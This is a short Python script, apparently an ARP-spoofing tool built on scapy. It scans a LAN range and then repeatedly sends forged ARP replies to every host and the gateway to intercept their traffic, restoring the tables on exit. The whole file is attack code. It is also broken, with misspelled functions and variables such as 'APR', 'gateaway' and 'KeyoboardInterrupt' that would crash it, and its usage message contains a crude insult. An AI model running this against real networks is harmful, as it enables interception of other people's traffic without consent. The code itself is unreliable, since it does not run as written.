#!/usr/bin/env python3

from scapy.all import *
from colorama import Fore, init
import argparse
import sys

init()

parse = argparse.ArgumentParser()
parse.add_argument("-r","--range",help="Range to scan or spoof")
parse.add_argument("-g","--gateway",help="Gatewat")
parse = parse.parse_args()

def get_mac(gateway):
    arp_layer = ARP(pdst=gateway)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/arp_layer

    mac = srp(final_packet, timeout=2, verbose=False)[0]
    mac = mac[0][1].hwsrc
    return mac

def scanner(_range,gateway):
    list_hosts = dict()
    arp_layer = ARP(pdst=_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast/arp_layer

    answers = srp(final_packet, timeout=2, verbose=False)[0]
    
    print("\n")
    
    for a in answers:
        if a != gateway:
            print(
                    "[{}+{} HOST: {} MAC: {}]".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, a[1].psrc, a[1].hwsrc)
                )
            list_hosts.update({a[1].psrc: a[1].hwsrc})
    return list_hosts
    
def restore_arp(destip,sourceip,hwsrc,hwdst):
    dest_mac = hwdst
    source_mac = hwsrc
    packet =  APR(op=2, pdst=destip, hwdst=dest_mac, psrc=sourceip, hwsrc=source_mac)
    send(packet, verbose=False)

def arp_spoof(hwdst, pdst,spsrc):
    spoofer_packet = APR(op=2, hwdst=hwdst, pdst=pdst, psrc=pscr)
    send(spoofer_packet, verbose=False)

def main():
    if parse.range and parse.gateway:
        mac_gateway = get_mac(parse.gateway)
        print(mac_gateway)
        hosts = scanner(parse.range, parse.gateway)
        try:
            print("\n[{}+{} RUNNING...]",format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
            while True:
                for n in hosts:
                    mac_target = hosts[n]
                    ip_target = n
                    gatway = parse.gateway
                    
                    arp_spoof(mac_gateway,gateway,ip_target)
                    arp_spoof(mac_target,ip_target,gateaway)
                    print("\r[{}+{}] Spoofing; {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, ip_target)), sys.stdout.flush()
        except KeyoboardInterrupt:
            print("\n\nRestoring tables ARP...")
            for n in hosts:
                mac_target = hosts[n]
                ip_taget = n
                gateway = parse.gateway

                restore_arp(gateway,ip_target,mac_gatway,mac_target)
                restore_arp(ip_target,gateway,mac_target,mac_gateway)

            exit(0)
    else:
        print("I need parameters bitch")

if __name__ == '__main__':
    main()
